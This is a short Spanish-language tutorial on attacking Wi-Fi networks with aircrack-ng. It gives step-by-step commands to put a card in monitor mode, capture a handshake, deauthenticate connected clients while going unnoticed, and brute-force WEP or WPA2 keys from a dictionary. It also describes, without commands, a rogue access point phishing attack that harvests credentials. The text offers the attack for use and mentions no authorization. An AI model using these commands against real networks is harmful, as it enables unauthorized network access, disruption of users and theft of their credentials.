Existen 2 tipos de ataques para hacer con aircrack-ng:

1. El primer ataque consiste en capturar el handshake de la víctima para poder hacer fuerza bruta y obtener la clave.
2. El segundo ataque consiste en desautenticar al usuario de la wifi para que se conecte a la nuestra, de esta forma le enviamos un formulario de registro para que nos de las credenciales (fishing).

Primer ataque

Nota1: Si una victima se autentica con la clave podemos cojer el handshake. Si la victima ya está autenticada y se une a la wifi, no siempre obtendremos el handshake. Para este segundo caso usaremos las inyecciones ARP.

Nota2: En el paso del airodump puede tardar demasiado en capturar una trama porque dependemos de cuando un cliente se conecta a la wifi, se explica arriba que no siempre se garantiza obtener el handshake. Para ello podemos desautenticar a todos los usuarios que se encuentran ahora mismo conectados con el siguiente comando, aveces se vuelen a connectar solos por lo que podemos pasar desapercibidos:
````
[root@kalilinux ~ ]# aireplay-ng --deauth <NÚMERO_PAQUETES (2-10)> -a <MAC_DE_ACCESS_POINT> -c <MAC_DE_CLIENTE> <INTERFAZ>
````
--
````
[root@kalilinux ~ ]# iwconfig
[root@kalilinux ~ ]# airmon-ng check kill
[root@kalilinux ~ ]# airmon-ng start <interfaz_wifi> <1-12 (canal_donde_se_desea_operar)>
[root@kalilinux ~ ]# airodump-ng <interfaz_wifi>
[root@kalilinux ~ ]# airodump-ng -w <output> --channel <canal> --bssid <bssid> <interfaz_wifi>

En otra terminal, en caso de querer desconectar a los clientes conectados a la red:
[root@kalilinux ~ ]# aireplay-ng --deauth 2 -a <MAC_DE_ACCESS_POINT> -c <MAC_DE_CLIENTE> <INTERFAZ>

Si la clave es WEP:
[root@kalilinux ~ ]# aircrack-ng -b <SSID_AP> <output*.cap>

Si la clave es WPA2:
aircrack-ng -a 2 -b <SSID_AP> -w <diccionario> <output*.cap>
````